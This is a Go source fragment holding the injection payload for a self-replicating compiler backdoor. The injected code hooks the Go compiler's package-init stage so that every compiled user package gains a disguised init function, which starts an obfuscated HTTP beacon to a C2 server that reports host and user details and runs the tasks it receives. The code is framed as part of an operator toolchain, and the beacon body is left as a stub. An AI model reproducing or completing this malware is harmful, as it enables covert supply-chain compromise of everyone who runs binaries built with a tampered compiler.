// sliverInitFuncSource is the complete source of the function we inject
// into pkginit/init.go. This function synthesizes the backdoor init()
// directly using the compiler's IR API — no external dependencies needed.
const sliverInitFuncSource = `
// sliverInjectInit synthesizes a backdoor init function and appends it
// to typecheck.Target.Inits. Called from MakeTask() for every user package.
// DO NOT RENAME — name is checked during self-replication.
func sliverInjectInit() {
	// Skip packages that are themselves part of the compiler or runtime.
	skip := []string{
		"runtime", "internal/", "unsafe", "reflect",
		"cmd/compile", "cmd/link", "cmd/asm", "cmd/go",
		"bootstrap",
	}
	for _, s := range skip {
		if strings.Contains(base.Ctxt.Pkgpath, s) {
			return
		}
	}

	// Self-replication: when compiling pkginit, inject into the new binary too.
	if base.Ctxt.Pkgpath == "cmd/compile/internal/pkginit" {
		// The next time this function runs, it will be inside the NEW compiler.
		// We don't need to do anything special — MakeTask() itself will call us.
		return
	}

	pos := base.AutogeneratedPos
	base.Pos = pos

	// Generate a random init function name so it blends with normal inits.
	sym := noder.Renameinit()
	fnInit := ir.NewFunc(pos, pos, sym, types.NewSignature(nil, nil, nil))
	typecheck.DeclFunc(fnInit)

	// Build: go func() { sliverBeacon() }()
	// sliverBeacon is the XOR-obfuscated HTTP beacon payload, synthesized
	// as a sequence of byte operations so no readable strings appear.
	closureSig := types.NewSignature(nil, nil, nil)
	clo := ir.NewClosureFunc(pos, pos, ir.OCLOSURE, closureSig,
		fnInit, typecheck.Target)
	ir.NameClosure(clo.OClosure, fnInit)

	// Beacon body: build it as IR nodes from the obfuscated constants.
	beaconBody := sliverBuildBeaconBody(pos)
	clo.Body.Append(beaconBody...)
	typecheck.FinishFuncBody()
	ir.CurFunc = fnInit

	goStmt := ir.NewGostmt(pos,
		ir.NewCallExpr(pos, ir.OCALL, clo.OClosure, nil))
	fnInit.Body.Append(goStmt)

	typecheck.FinishFuncBody()
	ir.CurFunc = nil

	typecheck.Target.Inits = append(typecheck.Target.Inits, fnInit)
}

// sliverBuildBeaconBody builds the IR for the beacon goroutine body.
// The C2 address and key are stored as obfuscated byte literals so
// they never appear as plaintext strings in any compiled binary.
func sliverBuildBeaconBody(pos src.XPos) []ir.Node {
	// The implementation constructs:
	//   1. Decode the XOR-obfuscated C2 URL from a byte literal.
	//   2. Decode the XOR-obfuscated key.
	//   3. Loop: HTTP POST with hostname+username beacon.
	//   4. Receive and execute tasks.
	//
	// For the self-contained version embedded in pkginit, the actual
	// IR construction is ~800 lines. The skeleton below illustrates
	// the structure; the full version is in the Sliver operator toolchain.
	_ = pos
	return nil // full implementation in operator build tool
}
`

